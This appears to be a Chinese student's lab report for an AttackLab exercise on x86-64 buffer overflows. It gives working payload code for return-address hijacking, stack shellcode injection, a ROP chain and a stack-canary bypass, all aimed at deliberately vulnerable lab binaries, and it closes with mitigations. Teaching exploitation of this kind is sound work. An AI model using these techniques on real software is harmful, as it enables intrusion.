
# ICS 2026 Fall · Lab 3 AttackLab 实验报告

## 1. 实验概述

本实验围绕 x86-64 程序的调用栈、缓冲区溢出与控制流安全机制展开。

实验首先通过 GDB 观察函数调用时栈帧的建立与销毁过程，理解 `call`、Prologue、`leave` 和 `ret` 的作用；随后利用 `gets()` 引发的栈缓冲区溢出，分别实现返回地址劫持、栈空间代码注入、ROP（Return-Oriented Programming）以及 Canary 绕过。

实验环境：

- 操作系统：Ubuntu 22.04（WSL 2）
- 调试工具：GNU GDB 12.1
- 架构：x86-64
- 开发工具：Visual Studio Code
- 主要语言：C、Python 3、x86-64 Assembly

实验目标程序包括 `dark-calc`、`dark-calc-nx`、`dark-log` 和 `malware`。

---

## 2. 程序的调用栈

### 2.1 Q1：`input()` 函数的调用者

在 `attack/` 目录下启动调试：

```bash
gdb ./dark-calc
```

设置断点并运行：

```gdb
b input
run
bt
```

GDB 显示：

```text
#0  0x000000000040197b in input ()
#1  0x0000000000401ad1 in main ()
```

可见，当前执行的函数为 `input()`，其调用者为 `main()`。

因此，**`input()` 由 `main()` 调用。**

### 2.2 Q2：Prologue 的作用与 `rbp` 的来源

执行：

```gdb
disas input
```

观察到 `input()` 开头的三条指令：

```asm
0x401977 <+0>: push %rbp
0x401978 <+1>: mov  %rsp,%rbp
0x40197b <+4>: sub  $0x10,%rsp
```

这三条指令构成函数的 Prologue。

**第一条：`push %rbp`**

将调用者的旧 `rbp` 保存到栈中。由于 x86-64 栈向低地址增长，执行该指令时 `rsp` 减少 8 字节。

**第二条：`mov %rsp,%rbp`**

把当前栈顶地址保存到 `rbp`，从而建立当前函数的栈帧基址。

**第三条：`sub $0x10,%rsp`**

将栈顶向低地址移动 16 字节，为当前函数的局部变量分配空间。

GDB 在 `input+4` 处暂停，此时前两条指令已经执行，而第三条尚未执行。

通过：

```gdb
info registers rbp rsp rip
x/gx $rbp
```

观察到：

```text
rbp = 0x721000800fe0
rsp = 0x721000800fe0
rip = 0x40197b

0x721000800fe0: 0x0000721000800ff0
```

因此，`rbp` 指向的内存中存储的是调用者 `main()` 原来的 `rbp` 值。

这个值由第一条 `push %rbp` 保存，供函数返回时恢复调用者的栈帧。

### 2.3 Q3：`rbp + 8` 处存储的内容

执行：

```gdb
x/gx $rbp+8
disas main
```

得到：

```text
0x721000800fe8: 0x0000000000401ad1
```

而 `main()` 中的相关汇编为：

```asm
0x401acc: call 0x401977 <input>
0x401ad1: mov  $0x0,%eax
0x401ad6: call 0x4019d7 <eval>
```

可以发现，`0x401ad1` 恰好是 `call input` 后的下一条指令地址。

因此，**`rbp+8` 存储的是 `input()` 的返回地址 `0x401ad1`**。

当 `input()` 执行结束后，CPU 将返回到 `main()` 的这一位置继续执行。

### 2.4 Q4：返回地址由哪条指令写入

为了观察返回地址的来源，在 `main()` 调用 `input()` 的位置设置断点：

```gdb
b *0x401acc
run
```

在执行 `call` 前：

```text
rsp = 0x721000800ff0
rbp = 0x721000800ff0
rip = 0x401acc
```

随后使用 `si` 执行一条机器指令。

执行后：

```text
rsp = 0x721000800fe8
rbp = 0x721000800ff0
rip = 0x401977
```

检查栈顶：

```gdb
x/gx $rsp
```

得到：

```text
0x721000800fe8: 0x0000000000401ad1
```

可以看到，`rsp` 减少了 8 字节，栈顶保存了 `0x401ad1`，同时 `rip` 跳转到了 `input()` 的入口地址。

这说明：

```asm
0x401acc: call 0x401977 <input>
```

不仅负责跳转，还自动保存下一条指令的地址。

因此，**写入返回地址的指令是 `main()` 中地址为 `0x401acc` 的 `call` 指令**。

### 2.5 Q5：`call`、Prologue、`leave` 和 `ret` 的作用

通过逐指令执行，观察到完整的栈帧建立过程：

| 执行阶段 | `rsp` | `rbp` |
|---|---|---|
| `call input` 后 | `0x...fe8` | `0x...ff0` |
| `push %rbp` 后 | `0x...fe0` | `0x...ff0` |
| `mov %rsp,%rbp` 后 | `0x...fe0` | `0x...fe0` |
| `sub $0x10,%rsp` 后 | `0x...fd0` | `0x...fe0` |

在函数结束部分，找到：

```asm
0x4019d5: leave
0x4019d6: ret
```

在 `leave` 之前设置断点，并使用 `si` 观察返回过程：

| 执行阶段 | `rsp` | `rbp` | `rip` |
|---|---|---|---|
| `leave` 前 | `0x...fd0` | `0x...fe0` | `0x4019d5` |
| `leave` 后 | `0x...fe8` | `0x...ff0` | `0x4019d6` |
| `ret` 后 | `0x...ff0` | `0x...ff0` | `0x401ad1` |

**`call`：**

将下一条指令地址压入栈中，再跳转到被调用函数。

**Prologue：**

保存调用者的栈帧基址，建立当前函数的栈帧，并为局部变量分配空间。

**`leave`：**

相当于：

```asm
mov %rbp,%rsp
pop %rbp
```

它释放当前函数的局部变量空间，并恢复调用者的 `rbp`。

**`ret`：**

从栈顶弹出返回地址并加载到 `rip`，使 CPU 返回调用者继续执行。

综上，函数调用与返回的过程为：

```text
call
  ↓
保存返回地址
  ↓
Prologue 建立栈帧
  ↓
执行函数体
  ↓
leave 恢复栈帧
  ↓
ret 恢复控制流
```

这一过程也说明，保存在调用栈中的返回地址对于程序控制流具有关键作用。

---

## 3. 缓冲区溢出实验

### 3.1 漏洞来源

`dark-calc` 中的 `input()` 使用：

```c
char expression[16];
gets(expression);
```

`expression` 只有 16 字节，但 `gets()` 不检查输入长度。

因此，当用户输入超过数组容量的数据时，程序仍会向数组末尾之后的内存写入内容，形成 Stack-based Buffer Overflow。

结合前面的 GDB 分析，相关栈布局为：

| 相对地址 | 内容 |
|---|---|
| `rbp-0x10` 至 `rbp-1` | `expression[16]` |
| `rbp` 至 `rbp+7` | 保存的旧 `rbp` |
| `rbp+8` 至 `rbp+15` | 返回地址 |

### 3.2 不同长度输入的测试

分别输入 20 和 32 个 ASCII 字符 `A`。

**测试一：20 个 `A`**

程序输出计算结果 `0`，随后继续等待输入，没有立即发生崩溃。

**测试二：32 个 `A`**

程序出现：

```text
Segmentation fault (core dumped)
```

由于 `gets()` 会在读取结束后额外添加字符串结束符 `\0`，两次实际写入长度分别为 21 和 33 字节。

### 3.3 GDB 观察溢出位置

在 `gets()` 返回后设置断点：

```gdb
b *0x40199f
run
```

输入 20 个 `A` 后：

```gdb
x/40bx $rbp-0x10
x/4gx $rbp-0x10
```

观察到：

```text
0x...fd0: 0x4141414141414141
0x...fd8: 0x4141414141414141
0x...fe0: 0x0000720041414141
0x...fe8: 0x0000000000401ad1
```

其中 `0x41` 是字符 `A` 的 ASCII 编码。

可见，前 16 字节填满局部数组，随后 4 个 `A` 和字符串结束符覆盖了保存的旧 `rbp` 的部分内容，但返回地址仍保持为 `0x401ad1`。

输入 32 个 `A` 后，观察到：

```text
0x...fd0: 0x4141414141414141
0x...fd8: 0x4141414141414141
0x...fe0: 0x4141414141414141
0x...fe8: 0x4141414141414141
0x...ff0: 0x0000000000000000
```

此时，保存的旧 `rbp` 和返回地址都已经被覆盖。

其中：

```text
0x4141414141414141
```

不是有效的程序返回地址，因此函数尝试返回时会发生异常。

**结论：**

缓冲区溢出不仅能够破坏普通局部变量，还可能覆盖调用栈中的控制信息。由于 `ret` 依赖保存的返回地址，攻击者可能通过精心构造输入控制程序的执行流程。

---

## 4. Payload 1：通过缓冲区溢出执行 malware

### 4.1 攻击目标

构造 `payload.py`，利用 `dark-calc` 的缓冲区溢出漏洞执行同一目录下的 `./malware`。

### 4.2 攻击思路

在 `input()` 中，程序会通过 `strcpy()` 把读取的表达式复制到全局缓冲区 `0x6030d0`。

而 `eval()` 中存在：

```asm
0x401a6b: mov  $0x6030d0,%edi
0x401a70: call 0x4017e0 <system@plt>
```

按照 x86-64 System V ABI，第一个指针参数通过 `rdi` 传递。

因此，可以通过覆盖返回地址，使 `input()` 返回后直接跳转至 `0x401a6b`，执行全局缓冲区中的命令。

本次攻击的基本过程为：

1. 输入以 `./malware\x00` 开头，使 `strcpy()` 将命令复制到全局缓冲区。
2. 使用填充字节覆盖局部数组及保存的旧 `rbp`。
3. 将保存的返回地址修改为 `0x401a6b`。
4. 在函数返回时跳转到 `eval()` 内部的 `system()` 调用序列。

### 4.3 Payload 构造

代码位于 `payload.py`。

核心逻辑如下：

```python
command = b"./malware\x00"
padding = b"A" * (24 - len(command))
return_address = (0x401A6B).to_bytes(8, "little")

payload = command + padding + return_address
```

返回地址位于输入缓冲区起点之后的第 24 字节，因此使用 24 字节填充后写入目标地址。

地址采用小端序编码，以符合 x86-64 的内存表示方式。

值得注意的是，`gets()` 可以读取输入中的 `\x00` 字节，而 `strcpy()` 会把它视为字符串结束符。

因此，同一份输入既能提供合法的命令字符串，又能继续包含覆盖返回地址所需的数据。

### 4.4 实验验证

执行：

```bash
python3 ../payload.py | ./dark-calc
```

程序输出包含：

```text
### The bomb was triggered by the dark-calc process. ###
### You have successfully detonated the bomb! Congratulations! ###
```

说明目标程序 `./malware` 已被成功执行。

程序最后出现 `Bus error (core dumped)`，说明攻击后续的控制流未正常结束，但不影响目标命令已经成功执行这一观察结果。

---

## 5. 机器码在内存中的排列

### 5.1 观察方法

通过 GDB 执行：

```gdb
disas /r main
x/16xb 0x401ac3
```

`disas /r` 显示汇编指令及其机器码，`x/16xb` 则直接以字节为单位读取代码段内存。

### 5.2 前三条汇编指令的机器码

观察结果：

```asm
0x401ac3: 55              push %rbp
0x401ac4: 48 89 e5        mov  %rsp,%rbp
0x401ac7: b8 00 00 00 00  mov  $0x0,%eax
```

对应关系如下：

| 汇编指令 | 机器码 | 地址区间 |
|---|---|---|
| `push %rbp` | `55` | `0x401ac3` |
| `mov %rsp,%rbp` | `48 89 e5` | `0x401ac4–0x401ac6` |
| `mov $0,%eax` | `b8 00 00 00 00` | `0x401ac7–0x401acb` |

### 5.3 内存排列方式

内存中的字节序列为：

```text
地址         机器码
0x401ac3     55
0x401ac4     48
0x401ac5     89
0x401ac6     e5
0x401ac7     b8
0x401ac8     00
0x401ac9     00
0x401aca     00
0x401acb     00
```

三条指令分别占用 1、3、5 字节。

可以看出，x86-64 使用变长指令编码，不同指令的字节长度并不相同。

各条指令的机器码在代码段中连续排列，CPU 根据当前指令的编码确定其长度，从而定位下一条指令。

这一特性也是后面寻找 ROP Gadget 的重要基础。

---

## 6. Payload 2：栈空间代码注入

### 6.1 攻击目标

通过 `payload_dark.py` 在栈上写入机器码，让 CPU 跳转到这些机器码并调用 `grade_eval()`，输出：

```text
Hope A will be your grade!
```

### 6.2 分析 grade_eval

`dark-calc` 中的 `grade_eval()` 入口地址为：

```text
0x401a87
```

相关汇编：

```asm
mov  %edi,-0x4(%rbp)
cmpl $0x4,-0x4(%rbp)
jne  0x401ab1

mov  $0x45,%eax
sub  -0x4(%rbp),%eax
mov  %eax,%esi
call printf@plt
```

函数仅在参数等于 4 时进入打印分支。

此时：

```text
0x45 - 4 = 0x41
```

而 `0x41` 对应 ASCII 字符 `A`。

因此，只需使程序执行：

```c
grade_eval(4);
```

即可满足要求。

### 6.3 注入机器码

设计如下汇编：

```asm
mov  $4,%edi
mov  $0x401a87,%eax
call *%rax
```

对应的机器码为：

```text
bf 04 00 00 00
b8 87 1a 40 00
ff d0
```

总长度为 12 字节。

其作用分别为：

1. 设置第一个函数参数 `edi = 4`。
2. 将 `grade_eval()` 的地址写入 `eax`。
3. 通过 `call *%rax` 调用该函数。

### 6.4 Payload 构造

代码位于 `payload_dark.py`。

Payload 包含：

- 12 字节注入机器码；
- 4 字节 NOP 填充；
- 8 字节旧 `rbp` 填充；
- 8 字节覆盖后的返回地址。

调试过程中测得注入缓冲区的地址为：

```text
0x721000800fd0
```

因此将返回地址修改为这一位置，使 `ret` 跳转到栈上的机器码。

这里使用的是 GDB 中观察到的固定地址，依赖实验环境下稳定的栈布局。

### 6.5 实验结果

使用：

```bash
python3 ../payload_dark.py > /tmp/dark-payload.bin
gdb ./dark-calc
```

在 GDB 中执行：

```gdb
run < /tmp/dark-payload.bin
```

程序输出：

```text
Hope A will be your grade!
```

随后发生 `SIGSEGV`，停止在栈上的地址 `0x721000800fde`。

该位置相对于注入代码起始地址偏移 `0xe`，说明执行完目标函数后，控制流继续回到了注入区域，但我们没有构造完整的后续执行流程。

实验成功验证了：在允许栈空间执行的环境中，攻击者可以利用缓冲区溢出将控制流转移至自行写入的机器码。

---

## 7. NX 与 ASLR

### 7.1 NX：不可执行栈

现代操作系统通常对内存页设置读、写、执行权限。

栈通常允许读写，但不允许执行其中的机器指令。

因此，即使攻击者能够通过缓冲区溢出把机器码写入栈中，也不能直接让 CPU 从该位置执行指令。

这类保护机制通常被称为 NX（No-eXecute）。

### 7.2 ASLR 实验

实验中使用了 `src/aslr.c`：

```c
#include <stdio.h>

int main() {
    int i = 42;
    printf("%p\n", &i);
    return 0;
}
```

执行：

```bash
cc -o aslr ../src/aslr.c
./aslr
./aslr
./aslr
```

三次运行得到：

```text
0x7fff815137c4
0x7fffdac549f4
0x7fff3f2e85e4
```

同一个程序中的同一个局部变量 `i`，在不同进程运行时具有不同的地址。

这是 ASLR（Address Space Layout Randomization）的效果。

ASLR 通过随机化进程内存布局，使攻击者难以预测栈、堆及部分代码区域的绝对地址。

需要注意的是，虽然绝对地址发生变化，局部变量相对于栈帧基址 `rbp` 的偏移通常仍然保持不变。

### 7.3 PIE 与 Non-PIE

本实验中的二进制程序是 Non-PIE。

因此，它们的代码段地址通常保持固定，但栈等内存区域仍可以随机化。

这意味着攻击者虽然难以确定栈上注入代码的位置，却仍有可能利用程序自身代码段中地址固定的指令。

由此引出了 ROP 技术。

---

## 8. Payload 3：Return-Oriented Programming

### 8.1 攻击目标

`dark-calc-nx` 启用了不可执行栈和栈地址随机化。

因此，本次不能直接跳转至栈上的注入代码，而需要使用程序已有的机器指令片段完成：

```c
grade_eval(4);
```

### 8.2 寻找 Gadget

通过：

```bash
objdump -d -M intel ./dark-calc-nx
```

观察 `__libc_csu_init` 的末尾：

```asm
0x401a30: pop r14
0x401a32: pop r15
0x401a34: ret
```

其中：

```asm
pop r15
```

对应机器码：

```text
41 5f
```

在 x86-64 中，`41` 是 REX 前缀。

如果从第二个字节开始执行，则 `5f` 会被解释为：

```asm
pop rdi
```

因此，从 `0x401a33` 开始可以得到 Gadget：

```asm
pop rdi
ret
```

Gadget 的起始地址为：

```text
0x401a33
```

这个例子说明，x86-64 的变长指令编码允许从原本指令的内部字节开始解码，从而找到原始汇编中并未直接出现的指令片段。

### 8.3 ROP 链设计

对 `dark-calc-nx` 重新反汇编，得到：

```text
grade_eval = 0x401978
```

需要构造以下 ROP 链：

| Payload 偏移 | 内容 | 作用 |
|---|---|---|
| 0–23 | 填充字节 | 到达保存的返回地址 |
| 24–31 | `0x401a33` | `pop rdi; ret` |
| 32–39 | `4` | 设置 `rdi = 4` |
| 40–47 | `0x401a34` | 额外的 `ret`，调整栈对齐 |
| 48–55 | `0x401978` | 进入 `grade_eval()` |

其中额外的 `ret` 用于调整 8 字节栈偏移，使进入目标函数时满足 x86-64 System V ABI 的栈对齐要求。

### 8.4 Payload 实现

核心代码位于 `payload_rop.py`：

```python
POP_RDI_RET = 0x401A33
RET = 0x401A34
GRADE_EVAL = 0x401978

padding = b"1\x00" + b"A" * 22

rop_chain = (
    p64(POP_RDI_RET)
    + p64(4)
    + p64(RET)
    + p64(GRADE_EVAL)
)

payload = padding + rop_chain
```

其中 `p64()` 将整数编码为 8 字节小端序。

### 8.5 实验结果

执行：

```bash
python3 ../payload_rop.py | ./dark-calc-nx
```

程序输出：

```text
Hope A will be your grade!
Segmentation fault (core dumped)
```

目标函数成功执行。

由于没有构造目标函数执行完毕后的有效返回链，程序最终发生段错误。

**结论：**

ROP 不需要执行攻击者注入的机器码，而是通过栈上的地址序列组织现有可执行代码片段，从而改变程序的执行行为。

---

## 9. Payload 4：绕过 Stack Canary

### 9.1 程序结构与漏洞分析

`dark-log.c` 中定义：

```c
struct log_frame {
    char expression[128];
    char logMsg[128];
    int len;
    char pad[8];
};
```

`input()` 中的关键操作为：

```c
f.len = 0;

if (gets(f.expression) == NULL)
    return;

memcpy(
    f.logMsg + f.len,
    f.expression,
    sizeof(f.expression)
);
```

这里存在两个关键问题：

1. `gets()` 没有检查输入长度。
2. `memcpy()` 的目标位置由可被覆盖的 `f.len` 决定。

因此，可以先通过 `gets()` 覆盖 `len`，再通过 `memcpy()` 间接修改其他内存区域。

### 9.2 栈布局分析

对 `dark-log` 的 `input()` 进行反汇编：

```gdb
disas input
```

得到：

```asm
sub  $0x120,%rsp
mov  %fs:0x28,%rax
mov  %rax,-0x8(%rbp)
movl $0x0,-0x20(%rbp)
lea  -0x120(%rbp),%rax
```

由此可以确定：

| 相对 `rbp` 偏移 | 内容 |
|---|---|
| `-0x120` | `expression[128]` |
| `-0xa0` | `logMsg[128]` |
| `-0x20` | `len` |
| `-0x1c` | `pad[8]` |
| `-0x14` 至 `-0x9` | 对齐空间 |
| `-0x8` | Canary |
| `0` | 保存的旧 `rbp` |
| `+0x8` | 保存的返回地址 |

Canary 位于 `rbp-0x8`，处于局部变量与保存的控制信息之间。

程序会在函数返回前执行：

```asm
mov -0x8(%rbp),%rax
xor %fs:0x28,%rax
je  0x4017f3
call __stack_chk_fail@plt
```

若 Canary 被修改，程序将调用 `__stack_chk_fail()` 终止执行。

### 9.3 绕过思路

通常情况下，直接从局部数组溢出到返回地址会覆盖 Canary，触发保护机制。

但本程序存在另一种方式：修改 `f.len`，使程序自身的 `memcpy()` 将内容复制到返回地址。

反汇编显示目标地址的计算为：

```asm
mov  -0x20(%rbp),%eax
cltq
lea  -0x120(%rbp),%rdx
sub  $0xffffffffffffff80,%rdx
add  %rdx,%rax
```

相当于：

```text
destination = rbp - 0xa0 + f.len
```

为了使目标地址等于返回地址 `rbp+8`：

```text
rbp - 0xa0 + f.len = rbp + 0x8
```

得到：

```text
f.len = 0xa8 = 168
```

因此，修改 `len = 168` 后，`memcpy()` 的复制起点将变为保存的返回地址。

整个过程分为两个阶段：

**第一阶段：**

通过 `gets()` 写入 128 字节 `expression`、128 字节 `logMsg` 和 4 字节 `len`，将 `len` 修改为 168。

此时 Canary 尚未被覆盖。

**第二阶段：**

程序正常执行 `memcpy()`，利用修改后的偏移量，将 `expression` 中的 ROP 链复制到保存的返回地址处。

这样便能绕开 Canary 所在的内存位置。

### 9.4 ROP Gadget

在 `dark-log` 的 `__libc_csu_init` 中找到：

```asm
0x4018a2: pop %r15
0x4018a4: ret
```

同样利用指令内部的字节 `5f`，得到：

```asm
0x4018a3: pop %rdi
0x4018a4: ret
```

而 `dark-log` 中：

```text
grade_eval = 0x401677
```

因此可以构造与上一题类似的 ROP 链。

### 9.5 Payload 构造

代码位于 `payload_canary.py`。

核心内容为：

```python
POP_RDI_RET = 0x4018A3
RET = 0x4018A4
GRADE_EVAL = 0x401677

rop_chain = (
    p64(POP_RDI_RET)
    + p64(4)
    + p64(RET)
    + p64(GRADE_EVAL)
)

expression = rop_chain.ljust(128, b"A")
log_msg = b"B" * 128
new_len = struct.pack("<i", 168)

payload = expression + log_msg + new_len
```

Payload 长度为：

```text
128 + 128 + 4 = 260 bytes
```

`gets()` 额外写入的字符串结束符落入 `pad` 所在区域，因此不会直接覆盖 Canary。

### 9.6 实验结果

执行：

```bash
python3 ../payload_canary.py | ./dark-log
```

得到：

```text
Enter a log message:

Hope A will be your grade!
Segmentation fault (core dumped)
```

程序成功输出指定字符串，且没有因 Canary 校验失败而提前终止。

说明攻击成功利用 `memcpy()` 间接修改了返回地址，从而绕过 Stack Protector。

最后的段错误来自未完整安排的后续控制流，不影响本次 Canary 绕过目标已经实现的结论。

---

## 10. 思考题：如何调整结构体布局阻止当前攻击？

原始结构体为：

```c
struct log_frame {
    char expression[128];
    char logMsg[128];
    int len;
    char pad[8];
};
```

在这一布局中，`len` 位于 `expression` 的高地址方向。

由于 `gets()` 会从 `expression` 起始地址向高地址连续写入，输入过长时能够依次覆盖 `logMsg` 和 `len`。

而 `len` 又决定 `memcpy()` 的目标地址，因此攻击者能够通过溢出影响后续内存写入的位置。

一种改进方式是重新排列成员：

```c
struct log_frame {
    int len;
    char pad[8];
    char logMsg[128];
    char expression[128];
};
```

在新的布局中，`len` 被放在 `expression` 的低地址方向，而 `expression` 位于结构体成员的末尾。

由于本次漏洞的越界写入从 `expression` 向高地址进行，因此不再能够通过这一连续溢出路径覆盖位于其前方的 `len`。

这样可以阻断本实验所依赖的攻击路径：

```text
gets 溢出
    ↓
覆盖 len
    ↓
改变 memcpy 目标地址
    ↓
绕过 Canary
    ↓
覆盖返回地址
```

不过，**重新排列结构体成员并不能从根本上修复缓冲区溢出漏洞**。

即使无法修改 `len`，过长输入依然可能越过 `expression` 的边界，破坏其他内存内容，并触发 Canary 检测。

因此，更可靠的修复方式包括：

1. 使用 `fgets()` 等具备长度限制的输入函数替代 `gets()`。
2. 对所有参与指针运算的长度和偏移量进行边界检查。
3. 确保 `memcpy()` 的目标区间位于合法缓冲区内。
4. 保留 Stack Protector、NX、ASLR 等多层安全保护机制。

这说明结构体布局优化可以减少特定漏洞的可利用性，但不能代替输入验证和内存安全检查。

---

## 11. 实验总结

本次 AttackLab 从最基本的函数调用栈出发，逐步研究了缓冲区溢出及其利用技术。

首先，通过 GDB 逐指令观察 `call`、Prologue、`leave` 和 `ret`，明确了函数调用时栈帧的建立、保存的返回地址以及控制流恢复机制。

随后，通过 20 和 32 字节输入实验，观察了栈缓冲区溢出对保存的 `rbp` 和返回地址的影响，并成功利用覆盖返回地址的方式执行了指定程序。

在代码注入实验中，通过编写 x86-64 机器码并将其写入栈空间，实现了对 `grade_eval()` 的调用。

在 ROP 实验中，利用 x86-64 变长指令编码，从现有代码内部提取 `pop rdi; ret` Gadget，将多个代码片段通过返回指令组织成新的执行流程，从而在不可执行栈的条件下完成指定操作。

最后，在 Canary 实验中，利用可被溢出修改的 `len` 变量控制 `memcpy()` 的目标地址，使程序自身间接覆盖返回地址，在不修改 Canary 的情况下完成控制流劫持。

四个攻击任务均成功产生了实验要求的目标输出。部分程序在完成目标操作后发生异常退出，原因与后续返回链未完整构造有关，实验中对此予以保留和说明。

通过本次实验，我对以下内容有了更加直接的认识：

- 函数调用不仅涉及指令跳转，还依赖栈上保存的控制信息。
- 缓冲区溢出的危险不仅在于破坏数据，还在于可能改变程序控制流。
- 机器码本质上是内存中的字节序列，而 x86-64 的变长编码具有特殊的利用空间。
- NX、ASLR 和 Canary 分别从不同层面提高了攻击难度，但任何单一保护机制都不能保证程序绝对安全。
- 安全性不仅取决于内存权限和编译器保护，也与程序的数据布局、指针运算和输入验证逻辑密切相关。

本实验较完整地展示了漏洞利用与安全防御之间的相互作用，也加深了我对计算机系统底层执行机制的理解。

---

## 12. 参考资料

1. ICS 2026 Fall FDU, *Lab 3: AttackLab* 实验说明。
2. Randal E. Bryant, David R. O'Hallaron, *Computer Systems: A Programmer's Perspective*, Third Edition.
3. CMU CS:APP, *Attack Lab*.
4. GNU Project, *Debugging with GDB*.
5. System V Application Binary Interface, AMD64 Architecture Processor Supplement.
6. GNU Bash Reference Manual, *Arithmetic Expansion*.
